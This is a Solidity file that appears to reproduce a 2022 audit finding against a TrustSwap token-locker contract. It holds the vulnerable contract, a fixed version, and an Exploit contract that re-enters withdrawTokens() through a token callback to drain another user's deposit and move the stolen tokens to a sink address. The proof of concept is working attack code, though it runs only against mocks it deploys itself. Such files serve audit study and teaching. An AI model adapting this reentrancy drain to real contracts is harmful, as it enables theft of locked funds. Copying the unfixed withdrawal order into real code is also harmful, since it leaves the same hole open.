// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

/*
 * AuditVault 57521 — TrustSwap LockToken (Zokyo, 2022-08).
 * withdrawTokens() performs external transfer() and burn() BEFORE it writes
 * nftMinted[id] = false. A token callback re-enters withdrawTokens for the
 * same id and pulls the deposit a second time, draining another locker.
 */

contract HookToken {
    string public name = "LockToken";
    string public symbol = "LOCK";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    uint256 public callbacksLeft;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function arm(uint256 n) external {
        callbacksLeft = n;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        _move(msg.sender, to, amount);
        if (callbacksLeft > 0 && to.code.length > 0) {
            callbacksLeft -= 1;
            IRecv(to).onTokensReceived();
        }
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        require(allowed >= amount, "allow");
        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;
        _move(from, to, amount);
        return true;
    }

    function _move(address from, address to, uint256 amount) internal {
        require(balanceOf[from] >= amount, "bal");
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
    }
}

contract NftBurn {
    uint256 public burns;

    function burn(uint256) external {
        burns += 1;
    }
}

contract LockToken {
    HookToken public immutable token;
    NftBurn public immutable nft;
    uint256 public nextId;
    mapping(uint256 => uint256) public depositOf;
    mapping(uint256 => address) public ownerOf;
    mapping(uint256 => bool) public nftMinted;

    constructor(HookToken _token, NftBurn _nft) {
        token = _token;
        nft = _nft;
    }

    function lockTokens(uint256 amount) external returns (uint256 id) {
        token.transferFrom(msg.sender, address(this), amount);
        id = ++nextId;
        depositOf[id] = amount;
        ownerOf[id] = msg.sender;
        nftMinted[id] = true;
    }

    function withdrawTokens(uint256 id) external {
        require(nftMinted[id], "not minted");
        require(ownerOf[id] == msg.sender, "not owner");
        uint256 amount = depositOf[id];
        // @> VULN: external transfer and burn run before nftMinted[id] is cleared
        token.transfer(msg.sender, amount);
        nft.burn(id);
        nftMinted[id] = false;
    }
}

contract LockTokenFixed {
    HookToken public immutable token;
    NftBurn public immutable nft;
    uint256 public nextId;
    mapping(uint256 => uint256) public depositOf;
    mapping(uint256 => address) public ownerOf;
    mapping(uint256 => bool) public nftMinted;

    constructor(HookToken _token, NftBurn _nft) {
        token = _token;
        nft = _nft;
    }

    function lockTokens(uint256 amount) external returns (uint256 id) {
        token.transferFrom(msg.sender, address(this), amount);
        id = ++nextId;
        depositOf[id] = amount;
        ownerOf[id] = msg.sender;
        nftMinted[id] = true;
    }

    function withdrawTokens(uint256 id) external {
        require(nftMinted[id], "not minted");
        require(ownerOf[id] == msg.sender, "not owner");
        uint256 amount = depositOf[id];
        nftMinted[id] = false;
        token.transfer(msg.sender, amount);
        nft.burn(id);
    }
}

interface IRecv {
    function onTokensReceived() external;
}

interface ILock {
    function lockTokens(uint256 amount) external returns (uint256 id);
    function withdrawTokens(uint256 id) external;
}

contract VictimLocker {
    function approveAndLock(HookToken token, address locker, uint256 amount) external returns (uint256 id) {
        token.approve(locker, type(uint256).max);
        id = ILock(locker).lockTokens(amount);
    }
}

contract Exploit {
    address internal constant SINK = 0x000000000000000000000000000000000000D00d;
    uint256 public constant PRINCIPAL = 1000 ether;

    HookToken public token;
    NftBurn public nft;
    LockToken public locker;
    VictimLocker public victim;
    uint256 public attackerId;
    uint256 public victimId;
    uint256 public stolen;
    bool internal reentered;

    constructor() {
        token = new HookToken();
        nft = new NftBurn();
        locker = new LockToken(token, nft);
        victim = new VictimLocker();
    }

    function onTokensReceived() external {
        if (reentered) return;
        reentered = true;
        try locker.withdrawTokens(attackerId) {} catch {}
    }

    function run() external {
        token.mint(address(this), PRINCIPAL);
        token.mint(address(victim), PRINCIPAL);
        token.approve(address(locker), type(uint256).max);
        attackerId = locker.lockTokens(PRINCIPAL);
        victimId = victim.approveAndLock(token, address(locker), PRINCIPAL);
        uint256 poolBefore = token.balanceOf(address(locker));
        token.arm(1);
        locker.withdrawTokens(attackerId);
        uint256 got = token.balanceOf(address(this));
        stolen = got - PRINCIPAL;
        require(poolBefore == PRINCIPAL * 2, "pool");
        require(stolen == PRINCIPAL, "stolen");
        require(token.balanceOf(address(locker)) == 0, "drained");
        require(nftMintedCleared(), "flag");
        token.transfer(SINK, stolen);
        require(token.balanceOf(SINK) == PRINCIPAL, "sink");
    }

    function nftMintedCleared() public view returns (bool) {
        return locker.nftMinted(attackerId) == false;
    }
}
